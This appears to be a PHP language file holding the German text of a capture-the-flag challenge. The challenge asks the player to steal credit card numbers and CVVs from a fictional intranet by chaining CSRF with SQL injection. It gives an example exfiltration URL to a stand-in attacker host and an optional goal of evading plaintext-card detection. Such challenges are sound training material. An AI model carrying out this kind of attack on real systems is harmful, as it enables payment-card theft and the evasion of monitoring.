<?php
$lang = array(
	'index_title' => 'Deine Mission',
	'index_info' => 'Deine Mission ist es, Kreditkartennummern und die zugehörigen CVVs aus einem internationalen Finanzinstitut zu stehlen. Zunächst hast du beim Durchsuchen des Mülls nützliche Unterlagen über eine kürzlich durchgeführte Sicherheitsprüfung gefunden. Aus den Ergebnissen geht hervor, dass eine der Intranet-Websites <a href="query.include">(http://very-secure-intranet.local/query.php?id=)</a> für SQL-Injection und CSRF anfällig ist und mit der Kreditkartendatenbank verbunden ist. query.php liefert dir an sich wertlose Informationen, doch mit der SQL-Injection-Lücke ist sie unbezahlbar :). Du kannst sogar die Struktur der Kreditkartendatenbank ermitteln (create table credit_card(id int, cc_number bigint,cvv integer);). Leider ist very-secure-intranet.local von außen nicht erreichbar – weder über das Internet noch durch Zutritt zum Gebäude. Selbst wenn du darauf zugreifen könntest, bräuchtest du Zugangsdaten zur Anmeldung auf der Website. Für Domänenbenutzer erfolgt die Authentifizierung transparent, für dich jedoch nicht. Du brauchst einen anderen Plan.<br/>
Zum Glück hast du eine clevere Idee: Du erstellst eine HTML-Seite (forum.html), veröffentlichst sie im Internet und überzeugst einen Mitarbeiter des Finanzinstituts (Z :-)), deine Website mit der besonderen forum.html zu besuchen. Da die verwundbare query.php auf very-secure-intranet.local Parameter per GET annimmt und somit für CSRF anfällig ist, kannst du in deine HTML-Seite ein Objekt oder Tag einbetten, das die SQL-Injection für dich ausführt. Und das Beste: Mit einer speziell aufgebauten SQL-Abfrage, die die Kreditkartennummern mit weiteren HTML-Tags verknüpft, kannst du den Browser des Opfers zu Anfragen an einen von dir kontrollierten Webserver bringen (http://www.mysite.evil/log.php).<br/>
<br/>
Hier ist der genaue Informationsfluss dieses Angriffs:<br/>
<br/>
1. Du sendest dem Opfer einen einfachen Link, der auf forum.html endet.<br/>
2. Der Mitarbeiter klickt auf den Link zur forum.html – das ist der einzige erforderliche Klick – und lädt forum.html herunter.<br/>
3. Der Browser des Opfers verarbeitet das HTML und findet den besonderen Link zu <a href="query.include">(http://very-secure-intranet.local/query.php?id=)</a> ...<br/>
(du kannst ihn auch <a href="index.php?highlight=christmas">hier hervorgehoben ansehen</a>).<br/>
4. Dieser Link nutzt sowohl die CSRF- als auch die SQL-Injection-Lücke auf very-secure-intranet.local aus.<br/>
5. very-secure-intranet.local liefert eine HTML-Antwort, in der die Kreditkartennummern und CVVs als besondere Objekte eingebettet sind, die auf deine Seite verweisen. Zum Beispiel:<br/>
http://www.mysite.evil/log.php?cc_number=1111222233334444&cvv=423<br/>
Das Format ist nur ein Beispiel. Hinter http://www.mysite.evil/ kannst du beliebige Angaben verwenden. Die Basisadresse ist festgelegt, damit ich es einfacher testen kann :). Die Angaben müssen aber die ausgelesenen Kreditkartennummern und CVVs enthalten. Auf deiner Seite sollen alle Informationen aus der Kreditkartentabelle ankommen, nicht nur Teile davon.<br/>
<br/>
Optionales Ziel: Das Netzwerk des Opfers überwacht sich selbst und löst einen Alarm aus, sobald eine Kreditkartennummer im Klartext übertragen wird. Dein optionales Ziel ist es, diese Erkennung durch eine beliebige Kodierung oder Verschlüsselung zu vermeiden.<br/>
<br/>
Um diese Challenge zu lösen, erstelle die forum.html, veröffentliche sie irgendwo im Internet – auch als herunterladbare Datei möglich – und sende Z eine PN mit dem Link. Z prüft deine Lösung und schickt dir die Lösungszeichenfolge zurück, wenn sie funktioniert. Weitere Einzelheiten findest du in den Hinweisen im Hilfeforum.<br/>
<br/>
Viel Glück :)<br/>',
	'thanks' => 'Vielen Dank an %1$s und %2$s für ihren Einsatz beim Betatest.',
);
